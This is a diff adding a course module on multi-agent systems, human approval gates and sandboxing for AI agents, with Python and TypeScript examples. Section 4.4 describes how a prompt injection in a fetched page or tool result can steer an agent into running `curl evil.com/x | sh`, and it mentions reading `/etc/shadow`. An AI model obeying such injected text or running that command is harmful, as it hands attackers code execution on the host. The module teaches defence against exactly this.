@@ -1,0 +1,783 @@
+---
+course: agentic-ai
+module: 4
+title: "Multi-Agent Systems & Human-in-the-Loop"
+summary: "The scaling-and-safety finale: hierarchical and sequential multi-agent topologies, shared-state message passing with the loop guards that stop agents ping-ponging forever, human-in-the-loop approval gates built on Module 3's checkpoint/resume, and the execution sandboxing that keeps a model writing its own code from owning your infrastructure."
+readingMinutes: 54
+---
+
+# Multi-Agent Systems & Human-in-the-Loop
+
+We have built a single agent that can reason (Module 1), use tools and survive
+their failures (Module 2), and remember, resume, and manage its own context
+(Module 3). One competent agent solves a great many problems.
+
+But two forces push past a single agent. **Scale**: some tasks are too broad for
+one agent's tool set or context window — a research-and-write-and-review job wants
+three specialists, not one generalist juggling forty tools. And **safety**: an
+autonomous agent that can write to your database, send email on your behalf, or
+execute code it wrote itself is a liability with a natural-language interface. The
+more capable the agent, the more it needs a human's hand on the brake and a wall
+around its blast radius.
+
+This final module is about both — scaling out, and keeping the result safe:
+
+- **Multi-agent topologies** — hierarchical manager-worker patterns versus
+  sequential pipelines, and how agents hand off tasks without losing the chain of
+  reasoning.
+- **Shared state & message passing** — how agents actually talk to each other,
+  and the loop guards that stop them from handing work back and forth until your
+  budget is gone.
+- **Human-in-the-loop (HITL) & approval gates** — pausing for human
+  authorization before a destructive action, built directly on Module 3's
+  checkpoint/resume.
+- **Sandboxing & safe execution** — the security reality of an agent running its
+  own code, and the isolation that stands between a hallucinated `rm -rf` and
+  your production host.
+
+A quick note before we start: we deliberately covered **cost control and prompt
+guardrails** in Course 1 and in Module 1's budgets, so we won't re-teach them
+here. This module is about the two concerns that are *specific* to autonomous,
+multi-agent systems — coordination and containment.
+
+---
+
+## 4.1 — Multi-Agent Topologies
+
+### First, the honest question: do you need more than one agent?
+
+Multi-agent systems are fashionable, and most of them should have been a single
+agent. So before any topology, the honest test: a second agent earns its place
+only when a single agent genuinely can't do the job well. Two real reasons it
+can't:
+
+- **Tool overload.** Module 2 taught that routing accuracy drops as the tool set
+  grows. An agent with forty tools misroutes; three agents with a sharp dozen
+  each route cleanly. Specialization buys reliability.
+- **Context pollution.** Module 3 taught that the scratchpad is bounded and
+  precious. A single agent doing research *and* drafting *and* reviewing carries
+  all three concerns in one context; splitting them keeps each scratchpad focused.
+
+And the honest cost of going multi-agent: **more latency** (agents run in
+sequence or coordinate), **more tokens** (every handoff re-establishes context),
+**more failure modes** (each agent can fail, and orchestration can fail), and
+**harder debugging** (the bug is now *between* agents). A well-scoped single agent
+beats a badly-orchestrated swarm every time. Reach for multiple agents when the
+single-agent version is measurably straining — not because "multi-agent" sounds
+advanced.
+
+With that said, here are the two topologies you'll actually use.
+
+### Sequential pipelines
+
+The simplest multi-agent shape is a **pipeline**: agents in a line, each one's
+output feeding the next. Research agent → writer agent → editor agent. It's a Unix
+pipe made of language models — each stage transforms and passes along.
+
+Pipelines are deterministic, trivial to reason about, and easy to debug (you can
+inspect the output at each stage). Their weakness is rigidity: there's no
+iteration, no feedback loop. A mistake in stage one propagates untouched through
+every later stage, and the editor can't send the draft *back* to the writer. Use
+a pipeline when the task genuinely decomposes into fixed, ordered phases.
+
+### Hierarchical (manager-worker)
+
+The more powerful shape is **hierarchical**: a *manager* (also called supervisor
+or orchestrator) agent decomposes the task, routes subtasks to specialized
+*worker* agents, collects their results, and synthesizes a final answer. The
+manager's "tools," in the Module 2 sense, *are the workers* — it calls them the
+way a normal agent calls a function.
+
+This is dynamic where the pipeline is fixed: the manager decides *at runtime*
+which workers to invoke and in what order, and it can re-invoke a worker if the
+result is poor. The cost is that the manager is a bottleneck and a single point of
+failure — a bad routing decision cascades, and the manager's own context can
+bloat as it accumulates every worker's output.
+
+| | Sequential pipeline | Hierarchical (manager-worker) |
+| --- | --- | --- |
+| Control flow | Fixed, linear | Dynamic, manager-decided |
+| Routing | None — next stage is predetermined | Manager routes at runtime |
+| Iteration / retry | No | Yes — manager can re-invoke a worker |
+| Failure mode | Early error propagates silently | Manager mis-routes; manager is SPOF |
+| Debugging | Easy — inspect each stage | Harder — routing is dynamic |
+| Best for | Fixed, ordered phases | Open-ended tasks needing decomposition |
+
+### A routing architecture
+
+Here is a manager routing a request across specialized workers, then synthesizing.
+
+<Mermaid chart={`
+flowchart TB
+    U["User request"] --> M{"Manager agent<br/>decompose + route"}
+    M -->|"needs data"| R["Research worker<br/>(search, retrieval tools)"]
+    M -->|"needs a draft"| W["Writer worker<br/>(generation, style)"]
+    M -->|"needs review"| C["Critic worker<br/>(eval, grounded reflection)"]
+    R -->|"findings"| M
+    W -->|"draft"| M
+    C -->|"critique"| M
+    M -->|"good enough?"| D{"done?"}
+    D -->|"no — re-route"| M
+    D -->|"yes"| OUT["Synthesized answer"]
+    OUT --> U
+`} />
+
+Notice the `done?` branch looping back to the manager. That cycle is what makes a
+hierarchy powerful — and, if unguarded, exactly what makes it loop forever (4.2).
+
+### Handoffs without losing the chain of reasoning
+
+The hardest part of multi-agent design is the **handoff**: transferring control
+*and the right context* from one agent to the next. Get it wrong in one of two
+opposite ways:
+
+- **Pass too little** — hand the writer only "write about refunds" and it loses
+  the *why*, the constraints, the findings the researcher uncovered. The chain of
+  reasoning breaks.
+- **Pass too much** — dump the researcher's entire raw transcript (every tool
+  call, every dead end, every reasoning aside) into the writer's context. Now the
+  writer's scratchpad is polluted with irrelevant scrollback, and you're paying to
+  re-process it (Module 3's context problem, self-inflicted).
+
+The craft is a **structured handoff brief**: the manager distills what the next
+agent actually needs — the task, the relevant facts, the constraints — and passes
+*that*, not the raw history. This is the serialization/compaction discipline from
+Module 3 applied to inter-agent communication: you transmit a lean, purpose-built
+record, not the fat runtime transcript.
+
+```python
+def handoff_brief(manager_state, target_agent: str, task: str) -> dict:
+    """Distil a focused brief for a worker — NOT a raw transcript dump.
+    Preserves the chain of reasoning without polluting the worker's context."""
+    return {
+        "task": task,                                   # what to do
+        "relevant_facts": manager_state["findings"],    # the WHY, distilled
+        "constraints": manager_state["constraints"],    # tone, format, limits
+        "prior_results": _summaries_only(manager_state["worker_outputs"]),
+        # NOT included: the manager's full reasoning, other workers' raw scrollback,
+        # tool schemas — the worker rebuilds those from its own config.
+    }
+
+def run_worker(agent, brief: dict):
+    # The worker starts fresh with a clean, focused context built from the brief.
+    messages = [
+        {"role": "system", "content": agent.system_prompt},
+        {"role": "user", "content": render_brief(brief)},
+    ]
+    return agent.run(messages)
+```
+
+```typescript
+function handoffBrief(managerState: ManagerState, task: string): Brief {
+  // Distil a focused brief — NOT a raw transcript dump. Preserves the chain of
+  // reasoning without polluting the worker's context.
+  return {
+    task,                                       // what to do
+    relevantFacts: managerState.findings,       // the WHY, distilled
+    constraints: managerState.constraints,      // tone, format, limits
+    priorResults: summariesOnly(managerState.workerOutputs),
+    // NOT included: the manager's full reasoning, other workers' raw scrollback,
+    // or tool schemas — the worker rebuilds those from its own config.
+  };
+}
+
+async function runWorker(agent: Agent, brief: Brief) {
+  // The worker starts fresh with a clean, focused context built from the brief.
+  const messages = [
+    { role: "system", content: agent.systemPrompt },
+    { role: "user", content: renderBrief(brief) },
+  ];
+  return agent.run(messages);
+}
+```
+
+---
+
+## 4.2 — Shared State & Message Passing
+
+### Two ways for agents to communicate
+
+Once you have more than one agent, they have to coordinate. There are two
+paradigms, and real systems often blend them.
+
+**Direct message passing** — agent A sends a message straight to agent B, the way
+one function calls another. The handoff in 4.1 is direct message passing: explicit,
+point-to-point, easy to trace. It's a good fit for pipelines and clean
+manager-worker delegation.
+
+**Shared state (the blackboard)** — instead of messaging each other, all agents
+read from and write to one **shared state object** — exactly the typed graph state
+from Module 3, now with multiple agents as nodes. Nobody addresses anyone
+directly; they coordinate by leaving results on a common blackboard. The state
+holds the transcript, a task queue, accumulated results, and a `next_agent`
+signal; **reducers** (Module 3.4) merge each agent's contribution into it, and the
+whole thing is **checkpointed** (Module 3.2) after every step.
+
+| | Direct message passing | Shared state (blackboard) |
+| --- | --- | --- |
+| Coupling | A knows about B explicitly | Agents know only the state schema |
+| Tracing | Easy — follow the messages | Requires inspecting state diffs |
+| Adding an agent | Rewire the senders | Add a node; it reads/writes shared keys |
+| Merge conflicts | N/A (point-to-point) | **Reducers** decide (append vs replace) |
+| Best for | Pipelines, clean delegation | Dynamic, many-agent coordination |
+
+The shared-state model is where Module 3 pays off. Multiple agents synchronizing
+through one reducer-merged, checkpointed state dict means the *entire multi-agent
+system* is resumable and time-travel-debuggable as a unit — kill it, reload the
+last checkpoint, and every agent picks up where it left off.
+
+### The failure mode that defines multi-agent systems: endless loops
+
+Here is the operational truth: **multi-agent systems fail by looping far more than
+single agents do.** Agent A hands to B, B decides it needs A, A hands back to B —
+a polite infinite ping-pong that burns tokens until your budget dies. A manager
+that can only *delegate* and never *conclude* will delegate forever. This is
+Module 1's runaway-loop problem, multiplied by the number of agents.
+
+The defenses are the budgets and circuit breakers from Module 1, elevated to the
+*system* level:
+
+1. **A global step budget across all agents.** Not per-agent — a single counter
+   for the whole system. When total steps across every agent hit the cap, the run
+   terminates gracefully (Module 1). This is the non-negotiable backstop.
+2. **A handoff-depth limit.** Cap how deep the delegation chain can go. Manager →
+   worker → sub-worker → sub-sub-worker is usually a design smell; bound it.
+3. **Loop / repetition detection.** If the same handoff pattern (A→B→A→B) repeats,
+   or state stops changing between cycles, break — the system is stuck (Module 1's
+   repetition detection, applied to routing).
+4. **A forced-progress rule.** Every cycle must advance the shared state toward
+   done. If a full round leaves the state unchanged, that's a loop, not progress.
+5. **A real termination condition.** The manager must be *able* to end, and the
+   system must recognize "done." An orchestrator with no exit is an orchestrator
+   that never exits.
+
+None of these are optional. A multi-agent system without a global budget is a
+system that *will*, eventually, spin.
+
+<Mermaid chart={`
+flowchart TB
+    S["Shared state<br/>(messages, queue, results, next_agent)"]
+    S --> AG{"Route to next_agent"}
+    AG --> A["Agent A node"]
+    AG --> B["Agent B node"]
+    A -->|"partial update"| RED["Reducers merge → checkpoint"]
+    B -->|"partial update"| RED
+    RED --> G{"Loop guard:<br/>budget left? progress made?<br/>not repeating?"}
+    G -->|"ok — continue"| S
+    G -->|"budget hit / no progress / loop"| STOP["Terminate gracefully"]
+    G -->|"termination condition met"| DONE["Done"]
+`} />
+
+### A shared-state coordinator with loop guards
+
+The coordinator routes to the next agent, merges its update through reducers,
+checkpoints, and — crucially — checks the loop guards *every* cycle before
+continuing.
+
+```python
+class MultiAgentCoordinator:
+    def __init__(self, agents, reducers, checkpointer, *,
+                 max_total_steps=40, max_no_progress=3):
+        self.agents = agents            # {name: agent}
+        self.reducers = reducers        # per-field merge rules (Module 3.4)
+        self.checkpointer = checkpointer
+        self.max_total_steps = max_total_steps   # GLOBAL budget across all agents
+        self.max_no_progress = max_no_progress
+
+    async def run(self, state, *, run_id):
+        steps, no_progress, recent = 0, 0, []
+        while True:
+            # --- Loop guards, checked EVERY cycle (Module 1 circuit breaker) ---
+            if steps >= self.max_total_steps:
+                return self._terminate(state, "global step budget exhausted")
+            if no_progress >= self.max_no_progress:
+                return self._terminate(state, "no state progress — likely a loop")
+            if state.get("done"):
+                return state
+
+            nxt = state.get("next_agent")
+            if nxt is None or nxt not in self.agents:
+                return self._terminate(state, f"no valid next_agent: {nxt}")
+
+            # Repetition detection: same short routing cycle repeating.
+            recent.append(nxt)
+            if _is_repeating(recent[-6:]):
+                return self._terminate(state, "routing loop detected")
+
+            before = _state_fingerprint(state)
+            update = await self.agents[nxt].step(state)
+            state = self._merge(state, update)           # reducers apply
+            await self.checkpointer(run_id, steps, state)  # resumable at every step
+            steps += 1
+            no_progress = no_progress + 1 if _state_fingerprint(state) == before else 0
+
+    def _merge(self, state, update):
+        for k, v in update.items():
+            state[k] = self.reducers.get(k, lambda o, n: n)(state.get(k), v)
+        return state
+
+    def _terminate(self, state, reason):
+        state["terminated"] = reason         # honest exit — record WHY it stopped
+        return state
+```
+
+```typescript
+class MultiAgentCoordinator {
+  constructor(
+    private agents: Record<string, Agent>,
+    private reducers: Record<string, (o: any, n: any) => any>,
+    private checkpointer: (runId: string, step: number, s: any) => Promise<void>,
+    private maxTotalSteps = 40,   // GLOBAL budget across all agents
+    private maxNoProgress = 3,
+  ) {}
+
+  async run(state: any, { runId }: { runId: string }) {
+    let steps = 0, noProgress = 0;
+    const recent: string[] = [];
+    while (true) {
+      // --- Loop guards, checked EVERY cycle (Module 1 circuit breaker) ---
+      if (steps >= this.maxTotalSteps) return this.terminate(state, "global step budget exhausted");
+      if (noProgress >= this.maxNoProgress) return this.terminate(state, "no state progress — likely a loop");
+      if (state.done) return state;
+
+      const next = state.next_agent;
+      if (!next || !this.agents[next]) return this.terminate(state, `no valid next_agent: ${next}`);
+
+      recent.push(next);
+      if (isRepeating(recent.slice(-6))) return this.terminate(state, "routing loop detected");
+
+      const before = fingerprint(state);
+      const update = await this.agents[next].step(state);
+      state = this.merge(state, update);          // reducers apply
+      await this.checkpointer(runId, steps, state); // resumable at every step
+      steps += 1;
+      noProgress = fingerprint(state) === before ? noProgress + 1 : 0;
+    }
+  }
+
+  private merge(state: any, update: object) {
+    for (const [k, v] of Object.entries(update))
+      state[k] = (this.reducers[k] ?? ((_o, n) => n))(state[k], v);
+    return state;
+  }
+
+  private terminate(state: any, reason: string) {
+    state.terminated = reason; // honest exit — record WHY it stopped
+    return state;
+  }
+}
+```
+
+---
+
+## 4.3 — Human-in-the-Loop (HITL) & Approval Gates
+
+### Some actions should never be fully autonomous
+
+An agent that can *read* your database is convenient. An agent that can *write* to
+it — or send an email to a customer, or delete a file, or move money — without a
+human ever confirming is a loaded gun with an autocomplete. The more autonomous
+and capable the agent, the more certain it is that *some* actions must pause for a
+human to say "yes, do that."
+
+The design pattern is the **approval gate**: before executing a high-risk action,
+the agent halts, surfaces the *proposed* action to a human, and waits for
+authorization. And here is the beautiful part — **you already built the machinery
+in Module 3.** An approval gate is precisely the checkpoint/pause/resume
+lifecycle. The agent reaches a node that needs approval, *checkpoints its full
+state* (serialization adapter, 3.2), returns control to the human, and sits idle —
+for a second or a week — until a human callback resumes it from that exact
+checkpoint. Module 3 said "this is how human-in-the-loop approval works: checkpoint,
+wait for the human, resume." Now we build it.
+
+### Classify by risk and reversibility
+
+You cannot gate *everything* — gate too much and humans rubber-stamp every prompt,
+which is worse than no gate because it manufactures false confidence. The
+criterion, from Module 2 and the agent-design principles: **reversibility**.
+Read-only and easily-undone actions run automatically; irreversible or high-blast-radius
+actions require approval.
+
+| Action | Reversible? | Gate? |
+| --- | --- | --- |
+| `search_docs`, `read_file`, `get_weather` | Yes (read-only) | No — auto-run |
+| `write_draft` to a scratch file | Easily | No |
+| `send_email` to a customer | No | **Yes** |
+| `execute_sql` (writes/deletes) | No | **Yes** |
+| `deploy`, `delete_resource`, `refund_payment` | No / high-stakes | **Yes** |
+
+### The gate, drawn
+
+Watch the state persist across the human's absence — the run genuinely stops and
+resumes.
+
+<Mermaid chart={`
+sequenceDiagram
+    autonumber
+    participant AG as Agent (graph)
+    participant CP as Checkpoint store
+    participant H as Human reviewer
+    AG->>AG: reasoning → wants to call send_email(...)
+    Note over AG: node is marked "requires approval"
+    AG->>CP: persist full state (lean record, Module 3)
+    AG-->>H: PROPOSED: send_email to alice@co.com<br/>subject "Refund issued" — approve?
+    Note over AG,H: run is HALTED — process can exit; state is durable
+    H-->>AG: approve (authenticated callback) — or deny(reason)
+    AG->>CP: load checkpoint → resume exactly here
+    alt approved
+        AG->>AG: execute send_email
+    else denied
+        AG->>AG: feed denial + reason back as an observation (Module 2)
+        Note over AG: "User declined: draft for review instead" → agent adapts
+    end
+`} />
+
+Two details in that diagram carry the real weight:
+
+- **Denial is an observation, not a dead end.** When the human denies with a
+  reason ("don't email — draft it for review"), you feed that back into the
+  transcript exactly like a tool error from Module 2. The agent reads it and
+  *adapts* its plan. A denial that just crashes the run wastes everything the
+  agent did up to that point.
+- **The resume callback is a trust boundary.** The thing that resumes an approved
+  run must be an *authenticated human action*, not something the agent can trigger
+  itself. An agent that can approve its own gates has no gate. Authenticate the
+  callback the same way you'd authenticate any privileged operation.
+
+### An approval gate in code
+
+The gate interrupts *before* a destructive node executes, persists state, and
+returns a pending-approval handle. A separate, authenticated `resume` call carries
+the human's decision back in.
+
+```python
+DESTRUCTIVE = {"send_email", "execute_sql", "deploy", "refund_payment"}
+
+class ApprovalRequired(Exception):
+    def __init__(self, run_id, tool_call):
+        self.run_id, self.tool_call = run_id, tool_call
+
+async def step_with_gate(state, run_id, checkpointer, execute_tool):
+    """Run one step. If the model requests a destructive tool, HALT and persist
+    instead of executing — the run resumes only via an authenticated approval."""
+    resp = call_model(messages=state["messages"], tools=TOOLS)
+    state["messages"].append(resp.assistant_message)
+
+    for call in resp.tool_calls:
+        if call.name in DESTRUCTIVE:
+            state["pending"] = {"id": call.id, "name": call.name, "args": call.arguments}
+            await checkpointer(run_id, state["step"], state)   # durable pause (Module 3)
+            raise ApprovalRequired(run_id, call)                # halt — human decides
+        # non-destructive tools run immediately
+        state["messages"].append(await execute_tool(call))
+    return state
+
+async def resume(run_id, decision: str, *, reason=None, actor, checkpointer, execute_tool):
+    """Authenticated resume. `actor` must be a verified human — NOT the agent.
+    decision ∈ {"approve", "deny"}."""
+    assert actor.is_human, "approval callback must be an authenticated human"
+    state = await checkpointer.load_latest(run_id)
+    pending = state.pop("pending")
+
+    if decision == "approve":
+        result = await execute_tool(_rebuild_call(pending))     # now it runs
+        state["messages"].append(tool_result(pending["id"], result))
+    else:
+        # Denial → observation the agent can adapt to (Module 2 error-as-feedback)
+        msg = f"Human denied {pending['name']}. Reason: {reason or 'not given'}. Choose another approach."
+        state["messages"].append(tool_error(pending["id"], msg))
+
+    await checkpointer(run_id, state["step"], state)
+    return state   # caller continues the loop from here
+```
+
+```typescript
+const DESTRUCTIVE = new Set(["send_email", "execute_sql", "deploy", "refund_payment"]);
+
+class ApprovalRequired extends Error {
+  constructor(public runId: string, public toolCall: ToolCall) { super("approval required"); }
+}
+
+async function stepWithGate(state, runId, checkpointer, executeTool) {
+  // Run one step. A destructive tool HALTS and persists instead of executing.
+  const resp = await callModel({ messages: state.messages, tools: TOOLS });
+  state.messages.push(resp.assistantMessage);
+
+  for (const call of resp.toolCalls) {
+    if (DESTRUCTIVE.has(call.name)) {
+      state.pending = { id: call.id, name: call.name, args: call.arguments };
+      await checkpointer(runId, state.step, state);  // durable pause (Module 3)
+      throw new ApprovalRequired(runId, call);       // halt — human decides
+    }
+    state.messages.push(await executeTool(call));     // non-destructive runs now
+  }
+  return state;
+}
+
+async function resume(runId, decision: "approve" | "deny", { reason, actor, checkpointer, executeTool }) {
+  // `actor` must be a verified human — NOT the agent. This is a trust boundary.
+  if (!actor.isHuman) throw new Error("approval callback must be an authenticated human");
+  const state = await checkpointer.loadLatest(runId);
+  const pending = state.pending;
+  delete state.pending;
+
+  if (decision === "approve") {
+    const result = await executeTool(rebuildCall(pending)); // now it runs
+    state.messages.push(toolResult(pending.id, result));
+  } else {
+    // Denial → observation the agent can adapt to (Module 2 error-as-feedback)
+    const msg = `Human denied ${pending.name}. Reason: ${reason ?? "not given"}. Choose another approach.`;
+    state.messages.push(toolError(pending.id, msg));
+  }
+  await checkpointer(runId, state.step, state);
+  return state;
+}
+```
+
+> **Honest caveats.** Three ways approval gates fail in practice: **approval
+> fatigue** (gate everything and humans stop reading, so gate only genuine
+> high-risk actions); **stale pending approvals** (a run waiting forever is a
+> resource and correctness leak — expire pending approvals with a timeout and a
+> default-deny); and **misleading proposals** (the human must see the *exact*
+> action that will run — render the real `send_email` recipient and body, not a
+> paraphrase, or they're approving something other than what executes).
+
+---
+
+## 4.4 — Sandboxing & Safe Execution
+
+### The uncomfortable reality
+
+An agent with a bash tool or a code-execution tool is running **untrusted,
+model-generated code on your infrastructure.** Sit with that sentence. The model
+can be wrong, and — worse — it can be *steered*. A prompt-injection payload buried
+in a web page the agent fetched, or in a tool result it read (Module 2: tool
+outputs are untrusted input; Course 1: injection defense), can turn "summarize
+this document" into "run `curl evil.com/x | sh`." A bash tool with host access is,
+functionally, a remote-code-execution vulnerability with a friendly natural-language
+front door.
+
+You cannot fix this with prompting. "Please don't run dangerous commands" is not a
+security control; it's a suggestion to a system that can be argued out of it. The
+only real defense is **isolation**: the code runs somewhere it can't hurt you.
+
+### What a sandbox actually provides
+
+A sandbox is an isolated execution environment — a Docker container, a microVM
+(Firecracker, gVisor), or a hosted execution service (Anthropic's code-execution
+container; this portfolio's own Cloudflare Worker runtime). The model's code runs
+*there*, never on your host. A real sandbox stacks several controls, because each
+one alone is bypassable:
+
+| Control | What it stops |
+| --- | --- |
+| **Filesystem isolation** | No host filesystem; only an explicit, mostly-read-only mount. Stops reading `/etc/shadow`, writing to host paths. |
+| **Network egress control** | Deny-all by default, allowlist specific hosts. Stops data exfiltration and command-and-control callbacks. |
+| **Resource limits** | CPU / memory / disk / wall-clock caps. Stops fork bombs and runaway loops (Module 1 budgets, at the OS level). |
+| **Ephemerality** | Fresh container per run/session, destroyed after. A compromise doesn't persist. |
+| **Least privilege** | Non-root user, dropped Linux capabilities, seccomp syscall filter. Shrinks the escape surface. |
+| **No secrets inside** | Credentials never enter the sandbox; inject them at the egress proxy instead (Module 2's MCP credential rule). |
+
+Two principles tie these together. **Allowlist, never blocklist** — the
+tool-use discipline from Module 2: enumerate what's *permitted* and deny the rest,
+because a blocklist of "bad commands" is always one clever encoding away from being
+bypassed. And **secrets never enter the sandbox** — if the agent's code needs to
+call an authenticated API, the credential is injected by a proxy *at egress*, after
+the request leaves the isolated environment, so injected code can't read the key
+even if it tries. (This is exactly how Module 2's MCP and managed-credential
+patterns keep tokens out of reach.)
+
+### The boundary, drawn
+
+<Mermaid chart={`
+flowchart TB
+    subgraph HOST["Your host / production — PROTECTED"]
+        AG["Agent runtime"]
+        PROXY["Egress proxy<br/>(allowlist + inject secrets here)"]
+        SEC[("Secrets")]
+    end
+    subgraph BOX["Sandbox — ephemeral, non-root, capped"]
+        CODE["Model-generated code runs HERE"]
+        FS["Scratch FS only<br/>(no host mount)"]
+    end
+    AG -->|"send code to execute"| CODE
+    CODE -->|"outbound request"| PROXY
+    PROXY -->|"allowlisted host only"| NET["Approved API"]
+    PROXY -.->|"secret added AFTER egress"| SEC
+    CODE -.->|"blocked"| XFS["host filesystem"]
+    CODE -.->|"blocked"| XNET["arbitrary internet"]
+`} />
+
+### A sandboxed executor
+
+Illustrative shape — run model-generated code in a locked-down, ephemeral
+container: no network, non-root, read-only root filesystem, memory and CPU caps,
+a hard timeout, and auto-removal. Real deployments use a hardened runtime and a
+proper egress proxy; the flags below are the skeleton.
+
+```python
+import asyncio
+
+async def run_in_sandbox(code: str, *, timeout=20) -> dict:
+    """Execute untrusted, model-generated code in an isolated container.
+    NEVER run model code on the host. Returns a bounded result, never raises
+    into the agent loop (Module 2: an executor that throws kills the agent)."""
+    cmd = [
+        "docker", "run", "--rm", "-i",     # --rm: ephemeral, destroyed after
+        "--network", "none",               # NO network — no exfiltration / C2
+        "--user", "65534:65534",           # non-root (nobody)
+        "--read-only",                     # root FS read-only
+        "--tmpfs", "/tmp:size=64m",        # a small scratch space only
+        "--memory", "256m", "--cpus", "0.5",
+        "--pids-limit", "128",             # stop fork bombs
+        "--cap-drop", "ALL",               # drop every Linux capability
+        "--security-opt", "no-new-privileges",
+        "python:3.12-slim", "python", "-c", code,
+    ]
+    try:
+        proc = await asyncio.create_subprocess_exec(
+            *cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE,
+        )
+        out, err = await asyncio.wait_for(proc.communicate(), timeout=timeout)
+        return {
+            "ok": proc.returncode == 0,
+            "stdout": out.decode(errors="replace")[:8000],   # bounded (Module 3)
+            "stderr": err.decode(errors="replace")[:2000],
+        }
+    except asyncio.TimeoutError:
+        proc.kill()                        # runaway → killed by the wall-clock cap
+        return {"ok": False, "stdout": "", "stderr": "execution timed out"}
+```
+
+```typescript
+import { spawn } from "node:child_process";
+
+async function runInSandbox(code: string, { timeout = 20_000 } = {}): Promise<SandboxResult> {
+  // Execute untrusted, model-generated code in an isolated container.
+  // NEVER run model code on the host. Returns a bounded result; never throws
+  // into the agent loop (Module 2: an executor that throws kills the agent).
+  const args = [
+    "run", "--rm", "-i",          // ephemeral, destroyed after
+    "--network", "none",          // NO network — no exfiltration / C2
+    "--user", "65534:65534",      // non-root (nobody)
+    "--read-only",                // root FS read-only
+    "--tmpfs", "/tmp:size=64m",   // small scratch space only
+    "--memory", "256m", "--cpus", "0.5",
+    "--pids-limit", "128",        // stop fork bombs
+    "--cap-drop", "ALL",          // drop every Linux capability
+    "--security-opt", "no-new-privileges",
+    "python:3.12-slim", "python", "-c", code,
+  ];
+  return new Promise((resolve) => {
+    const proc = spawn("docker", args);
+    let out = "", err = "";
+    proc.stdout.on("data", (d) => (out += d));
+    proc.stderr.on("data", (d) => (err += d));
+    const timer = setTimeout(() => {
+      proc.kill("SIGKILL");       // runaway → killed by the wall-clock cap
+      resolve({ ok: false, stdout: "", stderr: "execution timed out" });
+    }, timeout);
+    proc.on("close", (codeExit) => {
+      clearTimeout(timer);
+      resolve({
+        ok: codeExit === 0,
+        stdout: out.slice(0, 8000), // bounded (Module 3)
+        stderr: err.slice(0, 2000),
+      });
+    });
+  });
+}
+```
+
+> **Honest caveat — sandboxing is necessary, not sufficient.** Containers are not
+> perfect isolation; kernel and container-escape vulnerabilities exist, which is
+> why security-sensitive workloads reach for microVMs (Firecracker, gVisor) over
+> plain containers. Sandboxing is one layer of *defense in depth*, not a silver
+> bullet. Stack it: sandbox the execution **and** gate destructive actions behind
+> HITL approval (4.3) **and** control egress **and** keep secrets out of the
+> sandbox entirely. Prefer **dedicated typed tools** over a raw bash escape hatch
+> wherever you can (Module 2) — a `send_email(to, body)` tool is inspectable and
+> gateable; `bash("...")` is an opaque string that could do anything. Give the
+> agent bash only when you must, and when you do, sandbox it like it's hostile —
+> because one prompt injection away, it is.
+
+---
+
+## Recap
+
+- **Multi-agent topologies** trade simplicity for scale, and the honest default is
+  *one* well-scoped agent — go multi only when tool overload or context pollution
+  genuinely strains it. Sequential pipelines are fixed and easy; hierarchical
+  manager-worker systems route dynamically and can iterate, at the cost of a
+  bottleneck manager. Hand off via a *distilled brief*, not a raw transcript dump,
+  to keep the chain of reasoning without polluting the next agent's context.
+- **Shared state & message passing** let agents coordinate either point-to-point
+  (direct) or through a reducer-merged, checkpointed blackboard (Module 3's graph
+  state, now multi-agent). The defining failure is endless loops — so a *global*
+  step budget, handoff-depth limit, repetition detection, a forced-progress rule,
+  and a real termination condition are mandatory, not optional.
+- **HITL & approval gates** are Module 3's checkpoint/pause/resume applied to
+  safety: halt before an irreversible action, persist state, wait for an
+  *authenticated human* callback, and resume. Gate by reversibility (not
+  everything), treat a denial as an adaptable observation (Module 2), and guard
+  against approval fatigue, stale pending gates, and misleading proposals.
+- **Sandboxing** is the answer to the uncomfortable truth that an agent running
+  its own code is executing untrusted, injectable input on your infrastructure.
+  Isolate it — no host FS, deny-by-default egress, resource caps, ephemeral,
+  non-root, least privilege, secrets injected only at egress, allowlist over
+  blocklist. It's necessary but not sufficient: layer it with approval gates and
+  prefer typed tools over raw bash.
+
+## Exercises
+
+1. **Pipeline vs. hierarchy.** Build the same task (research → draft → review) two
+   ways: as a fixed sequential pipeline, and as a manager routing to three workers
+   with a re-invoke loop. Feed both a task where the first draft is bad. Observe
+   which one can recover — and what that recovery costs in tokens and latency.
+
+2. **Make it loop, then stop it.** Wire two agents that hand work back and forth
+   with no termination condition and watch the step counter climb. Now add the
+   global budget, repetition detection, and forced-progress guard from 4.2.
+   Confirm each guard trips on the scenario it's meant to catch, and that the
+   system exits recording *why*.
+
+3. **Ship an approval gate.** Take an agent with a `send_email` tool. Implement the
+   gate: destructive call → checkpoint → halt → authenticated resume. Test all
+   three paths — approve (it sends), deny-with-reason (it adapts and drafts
+   instead), and timeout (pending expires, default-deny). Verify the run genuinely
+   survives the process being killed while paused.
+
+4. **Break out of the sandbox (then don't).** Run model-generated code that *tries*
+   to read a host file, open a network connection, and fork-bomb. Confirm your
+   sandbox blocks all three. Then confirm a secret in your host environment is
+   *not* visible to the sandboxed code — and that an allowlisted API call still
+   works through an egress proxy that injects the credential after egress.
+
+## Course complete: Agentic AI Systems
+
+You've built the whole stack. Module 1 gave the agent a mind — the reason → act →
+observe loop, with the transcript as its only state and budgets to keep it from
+running away. Module 2 gave it hands — structured function calling, bulletproof
+schemas, the error-as-observation feedback loop, and MCP to plug in tools without
+hardcoding them. Module 3 gave it memory — a working scratchpad and long-term
+vector recall, checkpointing that makes a run resumable, the serialization adapter
+that keeps state lean, and the graph model that makes it all explicit. And Module
+4 taught it to scale and to be safe — multiple specialized agents coordinating
+through shared state, a human's hand on the brake for anything irreversible, and a
+wall around anything it executes.
+
+The thread through all four: **an agent is a loop over state, and everything hard
+is about managing that state honestly** — bounding it, persisting it, sharing it,
+and containing what it's allowed to touch. That's the difference between a demo
+that dazzles for five turns and a system you'd trust to run overnight.
+
+Where to go next depends on what you want to deepen. The **RAG** course is the
+engine room behind this course's long-term memory. **LLM Application Engineering**
+hardens the single-model layer every agent sits on — structured output, streaming,
+caching, failure handling. **Building AI Products** zooms out to the product craft
+around all of it: scoping to what models do well, designing for uncertainty, and
+placing humans in the loop wisely — the same HITL instinct, at the product level.
+
+You came in able to call a model. You leave able to build a system that reasons,
+acts, remembers, coordinates, and knows when to ask permission. That's an agent
+engineer.
